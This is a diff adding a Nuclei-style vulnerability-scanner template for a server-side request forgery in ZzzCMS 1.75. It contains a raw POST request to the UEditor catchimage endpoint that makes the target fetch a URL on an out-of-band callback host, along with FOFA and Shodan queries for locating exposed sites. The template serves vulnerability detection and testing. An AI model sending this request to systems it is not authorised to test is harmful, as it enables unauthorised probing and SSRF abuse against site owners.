@@ -1,0 +1,46 @@
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - http
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '{"state":'
+            - 'list":'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /plugins/ueditor/php/controller.php?action=catchimage&upfolder=1 HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          source[0]=http://{{interactsh-url}}/{{filename}}.txt
+id: zzzcms-ssrf
+info:
+    author: ritikchaddha
+    metadata:
+        fofa-query: title="ZzzCMS"
+        max-request: 1
+        shodan-query: html:"ZzzCMS"
+        verified: true
+    name: ZzzCMS 1.75 - Server-Side Request Forgery
+    reference:
+        - https://www.hacking8.com/bug-web/Zzzcms/Zzzcms-1.75-ssrf.html
+    severity: high
+    tags:
+        - zzzcms
+        - ssrf
+        - oast
+        - Zcms
+        - ZZCMS
+        - ueditor
+        - ZCMS
+        - ZZZCMS
+variables:
+    filename: '{{to_lower(rand_text_alpha(4))}}'
